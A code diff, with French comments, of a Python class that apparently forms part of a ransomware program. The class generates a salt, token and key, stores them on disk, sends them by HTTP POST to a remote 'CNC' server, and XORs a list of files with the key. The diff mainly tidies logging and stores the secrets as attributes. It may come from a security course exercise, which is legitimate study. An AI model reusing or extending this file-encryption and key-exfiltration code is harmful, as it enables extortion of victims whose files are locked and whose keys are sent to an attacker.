@@ -55,7 +55,6 @@ class SecretManager:
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         
         url = f"http://{self._remote_host_port}/new"
-        print(f"url d'envoi : {url}")
 
         elements = {
             "token" : self.bin_to_b64(token),
@@ -65,14 +64,12 @@ class SecretManager:
 
         jsonElements = json.dumps(elements)
 
-        print("Envoi des éléments par une requête post")
         reponse = requests.post(url, json = jsonElements)
-        print("Éléments envoyés !")
 
         if reponse.status_code != 200:
-            self._log(f"Erreur : {reponse.text}")
+            self._log.info(f"Erreur : {reponse.text}")
         else:
-            self._log(f"Les données ont été envoyées au CNC")
+            self._log.info(f"Les données ont été envoyées au CNC")
         
 
     def setup(self)->None:
@@ -91,27 +88,29 @@ class SecretManager:
         else:
             print("le fichier n'est pas présent dans le répertoire")
              #création des éléments cryptographiques
-            salt, token, key = self.create()
+            self._salt, self._token, self._key = self.create()
+
+            print(f"La clé créée est : {self._key}, type : {type(self._key)}")
 
             #si le fichier n'est pas présent dans le répertoire, on le crée
             if os.path.exists(self._path):
                 with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
-                    file_token.write(token)
+                    file_token.write(self._token)
                     file_token.close()
 
             else :
                 os.mkdir(self._path)
                 with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
-                    file_token.write(token)
+                    file_token.write(self._token)
                     file_token.close()
             
         with open(os.path.join(self._path, "salt.bin"), "wb") as file_salt:
-            file_salt.write(salt)
+            file_salt.write(self._salt)
             file_salt.close()
 
         print("Envoi des éléments au CNC...")
         #envoi des éléments au CNC
-        self.post_new(salt, key, token)
+        self.post_new(self._salt, self._key, self._token)
         print("Éléments envoyés !")
 
 
@@ -160,6 +159,7 @@ class SecretManager:
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
+        print(f"Clé utilisée : {self._key}, de type {type(self._key)}")
         xorfile(files, self._key)
 
 
